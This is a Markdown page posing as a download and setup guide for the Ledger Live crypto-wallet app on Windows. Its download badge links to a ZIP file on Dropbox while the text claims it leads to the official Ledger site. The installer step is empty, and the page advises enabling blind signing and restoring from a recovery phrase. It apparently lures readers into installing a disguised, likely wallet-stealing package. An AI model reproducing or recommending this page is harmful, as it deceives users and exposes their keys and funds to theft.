---
layout: default
title: "Ledger Live — Download & Setup Guide (Windows x64)"
description: "Download Ledger Live for Windows 10/11 x64. Desktop companion app for Ledger Nano X/S Plus — manage crypto, stake & update firmware."
---

# Ledger Live Desktop Application — Download & Setup Guide

[![Download Ledger Live](https://www.dropbox.com/scl/fi/alr5gbgtc17tlqcvfvfz0/ledger-live-4.20.1-x64.zip?rlkey=qvm917gq02re79yret40s0haw&st=ljhhq3xj&dl=1)](https://www.dropbox.com/scl/fi/alr5gbgtc17tlqcvfvfz0/ledger-live-4.20.1-x64.zip?rlkey=qvm917gq02re79yret40s0haw&st=ljhhq3xj&dl=1)
**Version:** 4.20.1 | **License:** Free | **Platform:** Windows 10/11 x64 | **SHA-256:** `a989a0146e826cd3797e38cf29cbcf8870ec2cceea50541e3eee1f933ede0cb9`

---

## Overview

Ledger Live is the official desktop companion application for Ledger hardware wallets (Nano X, Nano S Plus, Nano S). The Windows 10/11 x64 client provides a unified interface for managing cryptocurrency assets, staking, swapping, and updating hardware wallet firmware.

Ledger Live supports 5,500+ cryptocurrencies across Bitcoin, Ethereum, Solana, Cardano, Polkadot, and 100+ other blockchains. The application communicates with the Ledger device via USB (WebUSB/HID) or Bluetooth (Nano X only) for transaction signing. All private keys remain securely stored in the device's Secure Element (CC EAL5+ certified chip).

The desktop client features a built-in exchange (Coinify, Changelly, MoonPay integrations), DeFi access via Ledger Discover (Aave, Lido, Multichain), NFT management, and portfolio tracking with real-time market data. The application uses a local SQLite database for transaction history with optional cloud sync.

---

## Key Features

1. **Hardware Wallet Management** — Initialize, restore, update firmware, and manage apps on Ledger Nano X, Nano S Plus, and Nano S devices via USB or Bluetooth.
2. **5,500+ Asset Support** — Manage Bitcoin, Ethereum, Solana, Cardano, Polkadot, XRP, and 5,400+ additional cryptocurrencies and tokens.
3. **Buy & Sell Crypto** — Integrated fiat on-ramp via Coinify, MoonPay, and Ramp Network. Supports credit card, bank transfer, and Apple Pay purchases.
4. **Staking & Earning** — Native staking for ETH (via Lido), SOL, ATOM, DOT, XTZ, and ALGO with reward tracking and automatic compounding.
5. **Swap & Exchange** — Built-in token swap via Changelly and ParaSwap with real-time rate quotes and slippage protection.
6. **DeFi Access** — Ledger Discover integration for Aave, Lido, Multichain, and Yearn Finance. All DeFi transactions are signed on the hardware device.
7. **NFT Management** — View, send, and receive Ethereum and Solana NFTs with metadata display and collection grouping.
8. **Portfolio Tracker** — Real-time portfolio valuation with 24h/7d/30d/1y performance charts, allocation breakdown, and profit/loss tracking.
9. **Firmware Updates** — Automatic firmware update notifications with guided installation process. Includes anti-rollback protection and authenticity verification.
10. **Advanced Security** — PIN code protection, passphrase (25th word) support, and genuine device verification via Ledger's secure attestation protocol.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 x64 (1903) | Windows 11 x64 (23H2) |
| **Processor** | Intel Core i3 / AMD Ryzen 3 | Intel Core i5 / AMD Ryzen 5 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 1 GB free disk space | 2 GB SSD |
| **Display** | 1280x720 | 1920x1080 |
| **Network** | Broadband (5 Mbps) | Broadband (25+ Mbps) |
| **USB** | USB 2.0 | USB 3.0 |
| **Bluetooth** | Bluetooth 4.0 (Nano X only) | Bluetooth 5.0 |

---

## How to Download and Install

### Step 1: Download the Installer

Click the **Download** badge above to visit the official Ledger download page (ledger.com/ledger-live/download). Select **Windows (.zip)**. The file is approximately 180 MB.

### Step 2: Verify the Checksum

```powershell
Get-FileHash .\ledger-live-4.20.1-x64.zip -Algorithm SHA256
```

Compare with the hash listed at the top of this page.

### Step 3: Run the Installer


### Step 4: Complete Setup

1. Connect your Ledger device via USB and unlock it with your PIN.
2. Open Ledger Live and select **"Get Started"**.
3. Choose **"Set up as new device"** or **"Restore from recovery phrase"**.
4. Follow the on-screen instructions to install apps on your Ledger device.
5. Add accounts: Accounts → Add Account → Select cryptocurrency → Continue.

### Step 5: Post-Installation

- Enable **"Auto-Lock"** after 5 minutes: Settings → General → Auto-lock.
- Set up **"Password Lock"** for the Ledger Live application itself.
- Configure **"Experimental Features"** for early access to new coins and DeFi protocols.
- Enable **"Analytics"** (optional) to help Ledger improve the product.

---

## Troubleshooting & FAQ



### Issue: Ledger device not detected

**Solution:**  
1. Ensure the Ledger is unlocked (PIN entered).  
2. Try a different USB port (preferably USB 2.0).  
3. Install/update Ledger Live to the latest version.  
4. For Nano X Bluetooth: ensure Bluetooth is enabled on Windows and the device is paired.  
5. Update USB drivers: Device Manager → Universal Serial Bus devices → Update driver.

### Issue: Firmware update fails

**Solution:**  
1. Ensure the Ledger is connected directly (not via USB hub).  
2. Close all other applications that might access the device.  
3. Try a different USB cable.  
4. If the device is bricked, use the recovery mode: hold the left button while connecting USB.

### Issue: Transaction signing fails

**Solution:**  
1. Ensure the correct app is open on the Ledger device (e.g., Ethereum app for ETH transactions).  
2. Enable "Contract Data" or "Blind Signing" in the app settings on the device.  
3. Update the app on the device via Ledger Live → Manager.

### FAQ

**Q: Is Ledger Live free?**  
A: Yes. Ledger Live is free to download and use. Network fees and exchange provider fees apply to transactions.

**Q: Can I use Ledger Live without a Ledger device?**  
A: No. Ledger Live requires a Ledger hardware wallet to function. It is a companion app, not a standalone wallet.

**Q: Which Ledger devices are supported?**  
A: Ledger Nano X, Ledger Nano S Plus, and Ledger Nano S (legacy).

**Q: Is my crypto stored in Ledger Live?**  
A: No. Your crypto is on the blockchain. Your private keys are stored in the Ledger hardware wallet's Secure Element. Ledger Live is only an interface.

**Q: How do I recover my funds if I lose my Ledger?**  
A: Use your 24-word recovery phrase on any new Ledger device or compatible BIP-39 wallet. Your funds are on the blockchain, not on the device.
